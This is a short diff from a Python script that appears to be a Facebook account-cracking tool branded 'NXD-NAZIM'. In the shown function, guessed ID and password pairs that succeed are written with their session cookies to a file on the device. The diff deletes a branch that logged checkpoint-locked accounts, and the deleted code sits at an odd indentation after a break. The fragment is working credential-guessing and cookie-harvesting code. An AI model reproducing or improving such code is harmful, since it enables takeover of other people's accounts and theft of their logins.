@@ -477,10 +477,6 @@ def randm(ids,psd):
                 open('/sdcard/NXD-NAZIM/RNDM-COOKIE.txt','a').write(uid+'|'+pas+'|'+coki+'\n')
                 ok.append(uid)
                 break
-                elif 'www.facebook.com' in q['error']['message']:
-                     print(f"\r\r{M}[NXD-CP] {sid} | {ps} ")
-                     open('/sdcard/NXD-NAZIM/FILE-CP.txt','a').write(sid+'|'+ps+'\n')
-                     cps.append(sid)
             else:continue
         loop+=1
     except Exception as e:
